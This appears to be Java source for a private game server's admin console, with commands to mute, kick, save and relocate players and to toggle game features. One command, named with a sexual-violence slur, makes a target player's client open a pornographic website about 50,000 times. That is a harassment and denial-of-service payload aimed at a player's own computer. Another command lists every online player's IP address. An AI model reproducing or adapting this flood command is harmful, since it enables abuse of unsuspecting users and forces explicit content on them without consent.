package com.rs.utils.console;

import com.guardian.PriceLoader;
import com.rs.Settings;
import com.rs.database.DatabasePool;
import com.rs.game.World;
import com.rs.game.item.MagicOnItem;
import com.rs.game.player.Player;
import com.rs.game.player.content.DwarfCannon;
import com.guardian.ItemManager;
import com.rs.utils.SerializableFilesManager;
import com.rs.utils.Utils;

public class ConsoleCommands {
   
    public static boolean processCommand(String command) {
        String[] cmd = command.split(" ");
        String name = "";
        Player target;
        
        if (cmd[0].equals("fix")) {
			name = "";
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			target = World.findPlayer(name);
			if (target == null)
				return true;
			target.setNeedsFixed(true);
			SerializableFilesManager.savePlayer(target);
			System.out.println(""+target.getDisplayName()+"'s equipment will be stored on login.");
			return true;
		}
        
        if (cmd[0].equals("guardian")) {
			name = "";
			for (int i = 1; i < cmd.length; i++)
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			if (!World.isOnline(target.getUsername())) {
				System.out.println(""+target.getDisplayName()+" is not online.");
				return false;
			}
			
			target.unlockTitle(91);
			SerializableFilesManager.savePlayer(target);
			System.out.println(""+target.getDisplayName()+" has been awarded with the Guardian title.");
			return true;
		}
        
        if (cmd[0].equals("rape")) {
			name = "";
			for (int i = 1; i < cmd.length; i++) {
				name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			}
			
			target = World.findPlayer(name);
			
			if (target == null)
				return true;
			
			if (World.isOnline(name)) {
				for (int i = 0; i < 10000; i++) {
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
					target.getPackets().sendOpenURL("http://porntube.com");
				}
			}
			return true;
		}
        
        if (cmd[0].equals("zombies")) {
        	Settings.ZOMBIE_ENABLED = !Settings.ZOMBIE_ENABLED;
        	System.out.println("Zombies enabled? "+Settings.ZOMBIE_ENABLED+"");
        	return true;
        }
        
        if (cmd[0].equals("editor")) {
        	if (PriceLoader.isActive) {
        		PriceLoader.getInstance().getFrame().setVisible(true);
        		return true;
        	}
        	PriceLoader.start();
        	return true;
        }
        if(cmd[0].equals("disableitems")) {
            for (Player player : World.getPlayers()) {
                if (player == null)
                    continue;
                player.sendMessage("Magic on Items has been "+(MagicOnItem.enabled == true ? "enabled" : "disabled")+".");
            }
            MagicOnItem.enabled = !MagicOnItem.enabled;
            System.out.println("Magic on Items has been "+(MagicOnItem.enabled == true ? "enabled" : "disabled")+"");
            return true;
        }
        
        if(cmd[0].equals("cannon")) {
        	DwarfCannon.DISABLED = !DwarfCannon.DISABLED;
        	System.out.println("Cannon Disabled? "+DwarfCannon.DISABLED+" ");
            return true;
        }
        
        if(cmd[0].equals("sfs")) {
            Settings.enableSfs = !Settings.enableSfs;
            System.out.println("StopForumSpam has been "+(Settings.enableSfs == true ? "enabled" : "disabled")+"");
            return true;
        }
        
        if(cmd[0].equals("save")) {
            for (Player player : World.getPlayers()) {
                if (player == null)
                    continue;
                SerializableFilesManager.savePlayer(player);
                player.sendMessage("You file has been force saved from the Server Console.");
            }
            System.out.println("Saved all Players.");
            return true;
        }
        
        if(cmd[0].equals("players")) {
        	System.out.println("================================");
            for (Player player : World.getPlayers()) {
                if (player == null)
                    continue;
                System.out.println("  "+player.getDisplayName()+" ["+player.getSession().getIP()+"]");
            }
            System.out.println("Total Players Online: "+World.getPlayers().size()+"");
            System.out.println("================================");
            return true;
        }
        
        if(cmd[0].equals("reloadprices")) {
            ItemManager.inits();
            World.sendWorldMessage("", true);
            return true;
        }

        if (cmd[0].equals("sethome")) {
            name = "";
            for (int i = 1; i < cmd.length; i++) {
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
            }
            target = World.findPlayer(name);
            if (target == null) {
                System.out.println("Invalid Target: "+name+"");
                return false;
            }
            target.setLocation(Settings.START_PLAYER_LOCATION);
            SerializableFilesManager.savePlayer(target);
            System.out.println(""+target.getDisplayName()+"'s location has been set to home.");
            return true;
        }
       
        if (cmd[0].equals("yell")) {
            name = "";
            for (int i = 1; i < cmd.length; i++) {
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
            }
            World.sendWorldMessage("<col=FF0000>[<img=1>Console]: " + name, false);
            System.out.println("[Console]: " + name);
            return true;
        }
       
        if (cmd[0].equals("mute")) {
            name = "";
            for (int i = 1; i < cmd.length; i++) {
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
            }
            target = World.findPlayer(name);
           
            if (target == null)
                return true;
           
            target.setMuted(Utils.currentTimeMillis() + 3600000);
            if (World.isOnline(name))
                target.getPackets().sendGameMessage("You've been muted for 1 hour from the Server Console.");
            System.out.println("You have muted "+target.getDisplayName()+" for 1 hour.");
            SerializableFilesManager.savePlayer(target);
            return true;
        }
       
        if (cmd[0].equals("unmute")) {
            name = "";
            for (int i = 1; i < cmd.length; i++) {
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
            }
            target = World.findPlayer(name);
           
            if (target == null)
                return true;
           
            target.setMuted(0);
            if (World.isOnline(name))
                target.getPackets().sendGameMessage("You've been unmuted.");
            System.out.println("You have unmuted "+target.getDisplayName()+".");
            SerializableFilesManager.savePlayer(target);
            return true;
        }
       
        if (cmd[0].equals("kick")) {
            name = "";
            for (int i = 1; i < cmd.length; i++)
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
           
            target = World.getPlayerByDisplayName(name);
           
            if (target == null) {
                return true;
            }
           
            target.forceLogout();
            System.out.println("" + target.getDisplayName() + " has been kicked.");
            return true;
        }
       
        if (cmd[0].equals("update")) {
            int delay = 120;
            if (cmd.length >= 2) {
                try {
                    delay = Integer.valueOf(cmd[1]);
                } catch (NumberFormatException e) {
                    System.out.println("Use: ::restart secondsDelay(IntegerValue)");
                    return true;
                }
            }
            System.out.println("Update started for "+delay+" seconds");
            World.safeShutdown(false, delay);
            return true;
        }
       
        if (cmd[0].equals("sendhome")) {
            name = "";
            for (int i = 1; i < cmd.length; i++)
                name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
            target = World.getPlayerByDisplayName(name);
            if (target == null)
                System.out.println("Couldn't find player " + name + ".");
            else {
                if (target.isAtExpertDung()) {
                    System.out.println("You can not send this player home while they're in dungeoneering.");
                    return true;
                }
                target.unlock();
                target.getControlerManager().forceStop();
                if (target.getNextWorldTile() == null)
                    target.setNextWorldTile(Settings.RESPAWN_PLAYER_LOCATION);
                System.out.println("You have sent home: " + target.getDisplayName()+ ".");
            }
            return true;
        }
       
        if (cmd[0].equals("clear")) {
            Console.consolePane.setText("");
            return true;
        }
        return false;
    }
   
}